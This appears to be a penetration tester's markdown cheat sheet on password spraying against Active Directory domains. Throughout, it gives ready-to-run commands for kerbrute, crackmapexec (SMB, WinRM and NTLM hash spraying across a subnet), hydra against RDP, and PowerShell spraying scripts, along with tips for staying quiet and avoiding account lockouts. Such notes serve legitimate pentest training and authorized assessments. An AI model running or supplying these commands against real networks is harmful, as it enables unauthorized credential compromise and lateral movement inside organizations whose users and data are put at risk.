...
Try a common password among different **domain users** within the organization. It makes less noise and is less likely to block any account in the domain.

> [!Requirements]
> - AD User account list: check the [[AD Enumerating Users]]
> - AD Password Policy: check the [[AD Password Policy Enumeration]] (recommended)
...
$ kerbrute passwordspray -d DOMAIN_FQDN --dc DC_IP valid_users.txt  PASSWORD

+ SMB +
$ sudo crackmapexec smb TARGET -u valid_users.txt -p "Password123" --continue-on-success | grep +
```

> [!Note]
> - The TARGET_IP must be from a domain-joined host.
> - In the case of `crackmapexec`, (Pwned!) means that the user has admin privileges on the target.

- Validate credentials check:
```shell
$ sudo crackmapexec smb TARGET -u USERNAME -p PASSWORD
```

- Password spraying an NTLM hash for a local administrator account on a subnet (use it if dump a SAM database and extracted a local admin has):
```shell
$ sudo crackmapexec smb --local-auth SUBNET -u administrator -H LOCAL_ADMIN_NTLM_HASH | grep +
```

> [!Important]
> Use the `--local-auth` to perform the password against local admin accounts on the subnet instead of the domain admin account (it will block the account). 

- Known credentials domain spray (**IMPORTANT**):
```bash
+ SMB +
$ sudo crackmapexec smb TARGETS.txt -u VALID_AD_USERS.txt -p VALID_AD_PASSWORDS.txt

+ WINRM +
$ sudo crackmapexec winrm TARGETS.txt -u VALID_AD_USERS.txt -p VALID_AD_PASSWORDS.txt

+ RDP +
$ hydra -L VALID_AD_USERS.txt -P VALID_AD_PASSWORDS.txt TARGET_IP rdp
```
...
PS C:\> Invoke-DomainPasswordSpray -Password PASSWORD -OutFile spray_success -ErrorAction SilentlyContinue -Verbose

Parameters:
-UserList: user list we are going to use for spray (check note for more info)
-Password: password we are going to use for spray (for example Welcome1 or 123456 or password...)
...
- Using kerbrute (from Windows/Linux):
```powershell
PS C:\> .\kerbrute.exe passwordspray -d DOMAIN_FQDN [--dc DC_IP] valid_users.txt  "PASSWORD"
```

> [!Note]
> Kerbrute makes use of TGTs to perform the password spray by leveraging AS-REQ and examining the AS-REP
...
PS C:\> .\Spray-Passwords.ps1 [-Pass <PASSWORD>|-File <PWD_WORDLIST>] -Admin

Parameters:
-Pass: attempt a single password
-File: use a wordlist of passwords
-Admin: add Admin accounts to the password spray
```

> [!Note]
> This script will automatically fetch all the domain users and the password policy and perform a password spray attack without locking any account.
